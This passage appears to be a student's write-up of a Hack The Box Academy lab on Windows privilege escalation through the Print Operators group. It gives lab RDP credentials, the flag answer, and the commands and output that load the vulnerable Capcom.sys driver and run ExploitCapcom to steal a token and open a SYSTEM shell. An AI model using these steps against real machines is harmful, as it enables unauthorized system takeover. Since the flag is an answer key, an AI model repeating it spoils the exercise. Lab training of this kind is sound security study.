...
Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\Tools`. Issue the commands below to add a reference to this driver under our `HKEY_CURRENT_USER` tree.
...
## Questions
RDP to 10.129.43.31 (ACADEMY-WINLPE-DC02), with user `printsvc` and password `HTB_@cademy_stdnt!`
1. Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own. **Answer: Pr1nt_0p3rat0rs_ftw!**
   - Run everything in an elevated Powershell session:
        ```pwsh
        ...
        PS C:\Tools> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
        Value ImagePath exists, overwrite(Yes/No)? Yes
        The operation completed successfully.
        PS C:\Tools> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
        Value Type exists, overwrite(Yes/No)? yes
        The operation completed successfully.
        PS C:\Tools> ./EnableSeLoadDriverPrivilege.exe
        whoami:
        INLANEFREIGHT0\printsvc
        ...
        PS C:\Tools> .\ExploitCapcom\ExploitCapcom.exe
        [*] Capcom.sys exploit
        [*] Capcom.sys handle was obtained as 0000000000000074
        [*] Shellcode was placed at 000001ED488D0008
        [+] Shellcode was executed
        [+] Token stealing was successful
        [+] The SYSTEM shell was launched
        [*] Press any key to exit this program
        ```
   - In the pop up terminal, read the flag:
        ```cmd
